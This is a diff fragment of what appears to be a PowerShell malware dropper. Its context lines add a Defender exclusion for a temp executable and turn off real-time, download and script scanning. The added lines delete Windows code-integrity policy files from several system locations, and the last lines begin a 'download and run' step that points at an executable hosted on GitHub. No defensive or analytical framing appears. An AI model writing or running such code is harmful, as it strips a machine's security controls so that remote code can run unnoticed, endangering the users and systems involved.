@@ -24,6 +24,10 @@ Add-MpPreference -ExclusionPath "$env:TEMP\Comand.exe" -ErrorAction SilentlyCont
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableScriptScanning $true
+Remove-Item -LiteralPath "$((Get-Partition | ? IsSystem).AccessPaths[0])Microsoft\Boot\WiSiPolicy.p7b"
+Remove-Item -LiteralPath "$env:windir\System32\CodeIntegrity\WiSiPolicy.p7b"
+Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b"
+Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse
 
 # ============ DOWNLOAD + RUN EXE ============
 $url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
